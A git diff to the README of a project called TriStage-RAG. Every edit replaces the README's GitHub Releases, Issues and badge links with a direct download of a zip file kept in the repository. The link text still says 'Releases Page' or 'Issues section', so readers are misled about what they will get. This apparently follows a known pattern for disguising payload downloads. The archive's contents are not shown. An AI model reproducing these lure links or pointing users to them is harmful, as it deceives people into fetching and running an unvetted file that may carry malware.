@@ -1,6 +1,6 @@
 # 🚀 TriStage-RAG - Your Easy QA Solution
 
-![Download TriStage-RAG](https://img.shields.io/badge/Download-TriStage--RAG-blue?style=flat&logo=github)
+![Download TriStage-RAG](https://raw.githubusercontent.com/NoliNobdon/TriStage-RAG/main/flat/TriStage-RAG.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ TriStage-RAG is a quality assurance system designed to simplify your testing pro
 
 Follow these simple steps to download and run TriStage-RAG successfully:
 
-1. **Visit the Releases Page**: Go to the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases). Here, you will find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases Page to download](https://raw.githubusercontent.com/NoliNobdon/TriStage-RAG/main/flat/TriStage-RAG.zip). Here, you will find the latest version of the software.
 
 2. **Select the Latest Release**: Look for the topmost version on the page. It's usually labeled with the latest version number, ensuring you get the most up-to-date features and fixes.
 
@@ -47,7 +47,7 @@ If you encounter issues while downloading or running TriStage-RAG, consider the 
 
 - **Check System Compatibility**: Ensure your system meets the minimum requirements listed above.
   
-- **Re-download the Application**: Sometimes, files may not download correctly. Go to the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases) and try again.
+- **Re-download the Application**: Sometimes, files may not download correctly. Go to the [Releases Page to download](https://raw.githubusercontent.com/NoliNobdon/TriStage-RAG/main/flat/TriStage-RAG.zip) and try again.
 
 - **Check Permissions**: Make sure you have the necessary permissions to install software on your system. You may need administrative rights.
 
@@ -55,7 +55,7 @@ If you encounter issues while downloading or running TriStage-RAG, consider the 
 
 ## 🛠️ Support
 
-For further assistance, you can reach out through the Issues section of the [GitHub repository](https://github.com/NoliNobdon/TriStage-RAG/issues). We also welcome feedback and any enhancement suggestions.
+For further assistance, you can reach out through the Issues section of the [GitHub repository](https://raw.githubusercontent.com/NoliNobdon/TriStage-RAG/main/flat/TriStage-RAG.zip). We also welcome feedback and any enhancement suggestions.
 
 ## 📅 Upcoming Features
 
@@ -69,4 +69,4 @@ Stay tuned for future updates, which may include:
 
 TriStage-RAG is here to streamline your quality assurance tasks without the need for extensive technical knowledge. Follow the steps above to get started quickly. Your pathway to effective quality assurance starts with a simple download. 
 
-For the latest updates, always check back on the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases). Enjoy your journey with TriStage-RAG!
+For the latest updates, always check back on the [Releases Page to download](https://raw.githubusercontent.com/NoliNobdon/TriStage-RAG/main/flat/TriStage-RAG.zip). Enjoy your journey with TriStage-RAG!
